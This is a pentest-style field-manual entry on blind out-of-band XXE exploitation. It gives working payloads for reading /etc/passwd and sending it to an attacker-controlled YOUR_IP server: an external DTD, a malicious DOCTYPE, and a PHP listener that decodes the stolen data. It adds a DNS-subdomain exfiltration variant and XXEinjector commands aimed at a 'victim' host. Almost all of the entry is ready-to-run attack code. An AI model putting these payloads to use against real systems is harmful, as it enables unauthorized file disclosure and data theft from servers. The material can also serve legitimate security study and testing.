# Field Manual Entry â€” 9.3 Blind (OOB) Data Exfiltration (XXE)

Goal: Exfiltrate file content when:

- No injected entity appears in the response
- No error is displayed 
- You are fully blind    
#### 1. OOB Exfil via Base64-Encoded HTTP GET

When reflection and error-based methods fail, make the target server send the file content to your machine using an HTTP request with the content embedded in the URL.

Step 1: Create external DTD file (xxe.dtd)

```xml
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % oob "<!ENTITY content SYSTEM 'http://YOUR_IP:8000/?content=%file;'>">
```

- `%file;` reads and base64-encodes the target file
- `%oob;` embeds `%file;` inside a request to your server

Step 2: Start your server with a logging PHP script

Create `index.php`:

```php
<?php
if (isset($_GET['content'])) {
    error_log("\n\n" . base64_decode($_GET['content']));
}
?>
```

Run the PHP server:

```bash
php -S 0.0.0.0:8000
```

Step 3: Send XML payload to vulnerable app

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE data [
  <!ENTITY % remote SYSTEM "http://YOUR_IP:8000/xxe.dtd">
  %remote;
  %oob;
]>
<root>&content;</root>
```

- The server makes a GET request to your machine with base64 file contents as a query param.    
- `index.php` decodes it and logs it to your terminal.
#### 2. DNS-based Exfiltration (Optional)

If HTTP egress is blocked, encode the data in the subdomain of a DNS request.

```xml
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % oob "<!ENTITY content SYSTEM 'http://ENCODED.yourdomain.com'>">
```

Capture DNS requests using:

```bash
tcpdump -i tun0 port 53
```

Decode the subdomain value manually.
#### 3. Tooling: Automate with XXEinjector

Clone the tool:

```bash
git clone https://github.com/enjoiz/XXEinjector.git
```

Create the request file `/tmp/xxe.req`:

```http
POST /submit HTTP/1.1
Host: victim
Content-Type: application/xml

<?xml version="1.0" encoding="UTF-8"?>
XXEINJECT
```

Run:

```bash
ruby XXEinjector.rb --host=YOUR_IP --httpport=8000 \
--file=/tmp/xxe.req --path=/etc/passwd \
--oob=http --phpfilter
```

Exfiltrated data will be saved under `Logs/<host>/<file>.log`.

Use automation only after confirming that blind manual method works, or when testing at scale.